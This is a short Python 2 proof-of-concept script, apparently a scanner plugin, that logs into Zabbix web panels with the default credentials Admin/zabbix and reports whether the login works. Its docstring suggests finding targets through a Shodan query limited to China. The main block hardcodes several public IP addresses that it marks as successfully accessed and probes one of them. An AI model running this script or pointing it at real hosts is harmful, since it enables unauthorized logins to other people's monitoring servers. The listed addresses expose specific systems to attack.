# coding:utf-8

import requests
from bs4 import BeautifulSoup

"""
zabbix 默认口令检测
支持两种zabbix版本

Admin/zabbix

目标发现：shodan
Set-Cookie: zbx_sessionid country:cn

cdxy 16.04.20
"""


def _get_static_post_attr(page_content):
    """
    拿到<input type='hidden'>的post参数，并return
    """
    _dict = {}
    soup = BeautifulSoup(page_content, "html.parser")
    for each in soup.find_all('input'):
        if 'value' in each.attrs and 'name' in each.attrs:
            _dict[each['name']] = each['value']
    return _dict


def info():
    pass


def exp():
    pass


def poc(url):
    h1 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
    }

    h2 = {
        'Referer': url.strip('\n'),
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
    }

    blacklist = [
        'incorrect',
        '<!-- Login Form -->',

    ]
    try:
        s = requests.session()
        c = s.get(url, timeout=10, headers=h1)
        dic = _get_static_post_attr(c.content)
        dic['name'] = 'Admin'
        dic['password'] = 'zabbix'
        # print dic
        r = s.post(url + '/index.php', data=dic, headers=h2, timeout=10)
        if 'chkbxRange.init();' in r.content:
            for each in blacklist:
                if each in r.content:
                    return False
            else:
                return True
    except Exception, e:
        # print e
        return False


if __name__ == '__main__':
    url1 = 'http://54.222.167.52/'  # True
    url2 = 'http://180.235.64.209:8080/'  # True
    unsuccess_url = 'http://101.198.161.9'  # False
    print poc('http://106.2.60.133/')
